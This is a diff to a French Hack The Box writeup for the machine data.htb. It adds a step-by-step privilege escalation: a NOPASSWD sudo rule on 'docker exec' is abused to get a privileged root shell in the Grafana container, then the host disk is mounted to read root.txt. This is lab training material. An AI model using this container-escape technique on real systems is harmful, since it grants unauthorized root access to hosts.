@@ -122,9 +122,7 @@ Aucun templating Hugo dans le corps, pour éviter les erreurs d'archetype.
 -->
 ## Introduction
 
-- Contexte (source, thème, objectif).
-- Hypothèses initiales (services attendus, techno probable).
-- Objectifs : obtenir `user.txt` puis `root.txt`.
+Ce writeup propose un walkthrough complet de la machine **data.htb**, un challenge **CTF Easy** de Hack The Box centré sur l’analyse d’un service **Grafana** exposé sur un système **Linux**. L’objectif est de détailler, étape par étape, le cheminement depuis l’énumération initiale jusqu’à l’exploitation d’une **vulnérabilité web** connue, en mettant l’accent sur la compréhension du fonctionnement réel de l’application plutôt que sur l’usage aveugle d’un exploit. La démarche présentée est volontairement méthodique et reproductible, afin de fournir une base solide pour progresser en sécurité offensive et en exploitation de services web dans un contexte CTF.
 
 ---
 
@@ -771,27 +769,173 @@ ad3cxxxxxxxxxxxxxxxxxxxxxxxx0613
 
 ## Escalade de privilèges
 
-### Vers utilisateur intermédiaire (si applicable)
-- Méthode (sudoers, capabilities, SUID, timers, service vulnérable).
-- Indices collectés (configs, clés, cron, journaux).
+Une fois connecté en SSH en tant que `boris`, tu appliques la méthodologie décrite dans la recette
+   {{< recette "privilege-escalation-linux" >}}.
 
-### Vers root
-- Vecteur principal, exploitation, contournements.
-- Preuves : `id`, `hostnamectl`, `cat /root/root.txt`.
-- Remédiations possibles (leçons sécurité).
+### sudo -l
 
----
+La première étape consiste toujours à vérifier les droits `sudo` :
+
+```bash
+sudo -l
+Matching Defaults entries for boris on localhost:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User boris may run the following commands on localhost:
+    (root) NOPASSWD: /snap/bin/docker exec *
+
+```
+
+Ce droit te permet d’exécuter la commande `docker exec` avec les privilèges **root**, sans mot de passe, ce qui signifie que tu peux lancer des commandes à l’intérieur d’un conteneur sans restriction et ouvre, dans un contexte Docker, une voie directe vers une escalade de privilèges nécessitant une analyse approfondie.
+
+------
+
+### Identification du conteneur actif
+
+Tu vas maintenant chercher à identifier les conteneurs Docker actifs sur la machine afin de déterminer lequel peut être exploité pour l’escalade de privilèges.
+
+L’accès à la commande `docker ps` n’étant pas autorisé, tu peux identifier les conteneurs Docker actifs directement au niveau des processus système :
+
+```bash
+ps aux | grep -i docker | grep -v grep
+root      1015  0.0  4.0 1496232 81368 ?       Ssl  10:51   0:05 dockerd --group docker --exec-root=/run/snap.docker --data-root=/var/snap/docker/common/var-lib-docker --pidfile=/run/snap.docker/docker.pid --config-file=/var/snap/docker/1125/config/daemon.json
+root      1250  0.1  2.1 1351056 44408 ?       Ssl  10:51   0:20 containerd --config /run/snap.docker/containerd/containerd.toml --log-level error
+root      1514  0.0  0.1 1152456 3256 ?        Sl   10:52   0:00 /snap/docker/1125/bin/docker-proxy -proto tcp -host-ip 0.0.0.0 -host-port 3000 -container-ip 172.17.0.2 -container-port 3000
+root      1521  0.0  0.1 1078724 3344 ?        Sl   10:52   0:00 /snap/docker/1125/bin/docker-proxy -proto tcp -host-ip :: -host-port 3000 -container-ip 172.17.0.2 -container-port 3000
+root      1535  0.0  0.4 713120  8592 ?        Sl   10:52   0:00 /snap/docker/1125/bin/containerd-shim-runc-v2 -namespace moby -id e6ff5b1cbc85cdb2157879161e42a08c1062da655f5a6b7e24488342339d4b81 -address /run/snap.docker/containerd/containerd.sock
+472       1557  0.1  3.0 776036 62732 ?        Ssl  10:52   0:14 grafana-server --homepath=/usr/share/grafana --config=/etc/grafana/grafana.ini --packaging=docker cfg:default.log.mode=console cfg:default.paths.data=/var/lib/grafana cfg:default.paths.logs=/var/log/grafana cfg:default.paths.plugins=/var/lib/grafana/plugins cfg:default.paths.provisioning=/etc/grafana/provisioning
+root      2917  0.0  0.2  63972  4280 pts/0    S+   10:57   0:00 sudo /snap/bin/docker exec --privileged -u 0 -it e6ff5b1cbc85 sh
+root      2918  0.0  2.4 1289608 50260 pts/0   Sl+  10:57   0:02 /snap/docker/1125/bin/docker exec --privileged -u 0 -it e6ff5b1cbc85 sh
+```
+
+En listant les processus liés à Docker, tu identifies un processus `containerd-shim-runc-v2`, ce qui indique qu’un conteneur Docker est actif et te fournit son identifiant via l’option `-id`.
+ Les **12 premiers caractères** de cet identifiant (`e6ff5b1cbc85`) suffisent ensuite pour cibler le conteneur et exécuter des commandes à l’intérieur de celui-ci avec `docker exec`.
+
+------
+
+### Shell root via Docker
+
+L’aide de `docker exec` indique que les options `--privileged` et `--user root` permettent de lancer une commande à l’intérieur du conteneur avec des droits étendus. Dans ce contexte, la commande exécutée sera `/bin/bash` afin d’obtenir un shell root. Une fois ce shell root obtenu, tu disposeras des privilèges nécessaires pour effectuer des opérations système sensibles, comme le montage de partitions, ce qui permettra de monter la partition du système hôte directement dans le conteneur.
+
+```bash
+sudo /snap/bin/docker exec --privileged -u 0 -it e6ff5b1cbc85 sh
+```
+
+Tu confirmes ensuite le contexte d’exécution :
+
+```bash
+id
+uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
+```
+
+------
+
+### Identification des partitions du système hôte
+
+Une fois le shell root obtenu à l’intérieur du conteneur, tu peux identifier les périphériques de stockage exposés par l’hôte.
+ La consultation du fichier `/proc/partitions` permet de lister les disques et partitions disponibles :
+
+```bash
+cat /proc/partitions
+major minor  #blocks  name
+
+   7        0      56820 loop0
+   7        1     119340 loop1
+   7        2      25576 loop2
+   7        3      43184 loop3
+   8        0    6291456 sda
+   8        1    5242880 sda1
+   8        2    1047552 sda2
+
+```
+
+La sortie met en évidence la présence du disque principal `sda`, ainsi que de ses partitions, dont `sda1`, qui correspond à la partition système de l’hôte.
+
+Pour confirmer leur présence au niveau des périphériques, tu peux également vérifier le contenu du répertoire `/dev` :
+
+```bash
+ls /dev | grep sda
+sda
+sda1
+sda2
+
+```
+
+------
+
+### Montage de la partition système de l’hôte
+
+Disposant désormais des privilèges nécessaires, tu peux créer un point de montage dans le conteneur et y monter directement la partition système de l’hôte :
+
+```bash
+mkdir -p /mnt/host
+mount /dev/sda1 /mnt/host
+
+```
+
+Cette opération permet d’accéder au filesystem complet de la machine hôte depuis le conteneur :
+
+```bash
+ls -la /mnt/host
+total 112
+drwxr-xr-x   23 root     root          4096 Jun  4  2025 .
+drwxr-xr-x    1 root     root          4096 Jan 27 10:58 ..
+drwxr-xr-x    2 root     root          4096 Apr  9  2025 bin
+drwxr-xr-x    3 root     root          4096 Jun  4  2025 boot
+drwxr-xr-x    4 root     root          4096 Nov 29  2021 dev
+drwxr-xr-x   94 root     root          4096 Jun  4  2025 etc
+drwxr-xr-x    3 root     root          4096 Jun  4  2025 home
+lrwxrwxrwx    1 root     root            30 Apr  9  2025 initrd.img -> boot/initrd.img-5.4.0-1103-aws
+lrwxrwxrwx    1 root     root            30 Jun  4  2025 initrd.img.old -> boot/initrd.img-5.4.0-1103-aws
+drwxr-xr-x   19 root     root          4096 Apr 10  2025 lib
+drwxr-xr-x    2 root     root          4096 Apr  9  2025 lib64
+drwx------    2 root     root         16384 Nov 29  2021 lost+found
+drwxr-xr-x    2 root     root          4096 Nov 29  2021 media
+drwxr-xr-x    2 root     root          4096 Nov 29  2021 mnt
+drwxr-xr-x    2 root     root          4096 Nov 29  2021 opt
+drwxr-xr-x    2 root     root          4096 Apr 24  2018 proc
+drwx------    7 root     root          4096 Jan 27 10:52 root
+drwxr-xr-x    5 root     root          4096 Nov 29  2021 run
+drwxr-xr-x    2 root     root         12288 Jun  4  2025 sbin
+drwxr-xr-x    7 root     root          4096 Jan 23  2022 snap
+drwxr-xr-x    2 root     root          4096 Nov 29  2021 srv
+drwxr-xr-x    2 root     root          4096 Apr 24  2018 sys
+drwxrwxrwt   11 root     root          4096 Jan 27 15:34 tmp
+drwxr-xr-x   10 root     root          4096 Apr  9  2025 usr
+drwxr-xr-x   13 root     root          4096 Nov 29  2021 var
+lrwxrwxrwx    1 root     root            27 Apr  9  2025 vmlinuz -> boot/vmlinuz-5.4.0-1103-aws
+lrwxrwxrwx    1 root     root            27 Jun  4  2025 vmlinuz.old -> boot/vmlinuz-5.4.0-1103-aws
+
+```
+
+------
+
+### root.txt
+
+Une fois la partition montée, le contenu du système hôte devient accessible.
+ Tu peux notamment explorer le répertoire `/root` de l’hôte :
+
+```bash
+ls -l /mnt/host/root
+total 8
+-rw-r-----    1 root     root            33 Jan 27 10:52 root.txt
+drwxr-xr-x    4 root     root          4096 Jan 23  2022 snap
+
+```
+
+Le fichier `root.txt` est alors directement visible et peut être lu sans nécessiter de `chroot` :
+
+```
+cat /mnt/host/root/root.txt
+de7fxxxxxxxxxxxxxxxxxxxxxxxx5a77
+```
+
+Cette étape confirme l’obtention d’un accès **root complet** sur la machine hôte via l’exploitation de Docker.
 
 ## Conclusion
 
-- Récapitulatif de la chaîne d'attaque (du scan à root).
-- Vulnérabilités exploitées & combinaisons.
-- Conseils de mitigation et détection.
-- Points d'apprentissage personnels.
+La machine **data.htb** illustre parfaitement les fondamentaux d’un **CTF Easy** bien conçu : une énumération rigoureuse, une analyse attentive d’un service **Grafana** exposé et l’exploitation maîtrisée d’une **vulnérabilité web** sur un environnement **Linux**. Ce walkthrough montre qu’une approche structurée, fondée sur l’observation et la compréhension des mécanismes, permet d’aboutir efficacement sans recours excessif à l’automatisation. Les techniques abordées dans ce writeup sont directement réutilisables sur d’autres machines Hack The Box orientées web et services applicatifs.
 
 ---
 
-## Pièces jointes (optionnel)
-
-- Scripts, one-liners, captures, notes.  
-- Arbo conseillée : `files/<nom_ctf>/…`
